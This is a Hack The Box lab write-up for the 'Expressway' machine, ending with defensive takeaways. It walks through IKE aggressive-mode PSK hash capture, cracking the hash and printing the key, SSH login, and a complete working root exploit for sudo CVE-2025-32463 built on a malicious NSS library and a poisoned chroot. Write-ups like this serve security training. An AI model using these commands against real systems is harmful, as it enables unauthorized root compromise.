# Expressway - Hack The Box

**Difficulty:** Easy
**OS:** Linux
**IP:** 10.129.238.52

## Summary

Expressway is an easy Linux machine with a minimal attack surface — only SSH and an IKE/IPsec VPN service. IKE aggressive mode leaks the server identity and a PSK hash, which is crackable with a wordlist. The cracked pre-shared key doubles as the SSH password for the `ike` user. Privilege escalation exploits CVE-2025-32463, a critical "chroot-to-root" vulnerability in a custom SUID sudo binary (v1.9.17), allowing arbitrary code execution as root via a malicious NSS library.

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV 10.129.238.52
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8
```

Only SSH on TCP. A full port scan (`-p-`) confirmed no other TCP services.

### UDP Scan

```bash
nmap -sU --top-ports 100 10.129.238.52
```

```
PORT    STATE SERVICE
500/udp open  isakmp
```

UDP port 500 — ISAKMP (Internet Security Association and Key Management Protocol), used for IKE/IPsec VPN key exchange.

### IKE Enumeration

```bash
ike-scan -M 10.129.238.52
```

```
10.129.238.52  Main Mode Handshake returned
  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK)
  VID=09002689dfd6b712 (XAUTH)
  VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

The VPN uses IKEv1 with Pre-Shared Key authentication and XAUTH (extended authentication). The crypto suite is 3DES/SHA1/DH Group 2.

## Exploitation

### IKE Aggressive Mode — PSK Hash Capture

IKEv1 Aggressive Mode sends the identity and hash in fewer round trips than Main Mode, exposing the PSK hash to offline cracking.

```bash
ike-scan -M --aggressive --id=vpn --pskcrack=ike_hash.txt 10.129.238.52
```

```
10.129.238.52  Aggressive Mode Handshake returned
  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK)
  ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
  Hash(20 bytes)
```

The server leaked its identity: `ike@expressway.htb` and the PSK hash was saved to a file.

### PSK Cracking

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt ike_hash.txt
```

```
key "freakingrockstarontheroad" matches SHA1 hash
```

**Pre-Shared Key:** `freakingrockstarontheroad`

### SSH Access

The cracked VPN pre-shared key is reused as the SSH password for the `ike` user:

```bash
ssh ike@10.129.238.52
# Password: freakingrockstarontheroad
```

```bash
cat ~/user.txt
```

## Privilege Escalation

### Enumeration

Basic enumeration reveals two interesting findings:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/local/bin/sudo   # <-- unusual custom SUID binary
/usr/bin/sudo          # standard system sudo
```

Two sudo binaries exist. The custom one at `/usr/local/bin/sudo` is a newer version:

```bash
/usr/local/bin/sudo --version
# Sudo version 1.9.17

/usr/bin/sudo --version
# Sudo version 1.9.13p3
```

Sudo 1.9.17 is vulnerable to **CVE-2025-32463**.

### CVE-2025-32463 — Sudo chroot-to-root (CVSS 9.3)

This vulnerability affects sudo versions 1.9.14 through 1.9.17. The `-R` (`--chroot`) option resolves paths using a user-specified root directory while the sudoers file is still being evaluated. An attacker can craft a fake `/etc/nsswitch.conf` under the chroot directory that causes sudo to load a malicious shared library with root privileges.

#### Exploit

```bash
cd /tmp && mkdir -p sudowoot && cd sudowoot

# 1. Create malicious NSS library
cat > woot1337.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void woot(void) {
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
    execl("/bin/bash", "/bin/bash", NULL);
}
EOF

# 2. Build chroot structure with poisoned nsswitch.conf
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc/

# 3. Compile the malicious shared library
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

# 4. Trigger the exploit using the vulnerable sudo
/usr/local/bin/sudo -R woot woot
```

```
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

```bash
cat /root/root.txt
```

## Key Takeaways

1. **IKEv1 Aggressive Mode is insecure** — it exposes the PSK hash to offline attacks. Always use IKEv2 or at minimum IKEv1 Main Mode with strong pre-shared keys.
2. **Credential reuse** across services (VPN PSK reused as SSH password) is a common and dangerous practice.
3. **Custom SUID binaries** outside standard paths (`/usr/local/bin/sudo`) are red flags during enumeration. Always compare versions against known CVEs.
4. **CVE-2025-32463** demonstrates how a seemingly safe option (`--chroot`) can be weaponized when path resolution occurs in an attacker-controlled context. Upgrade to sudo 1.9.17p1 or later.
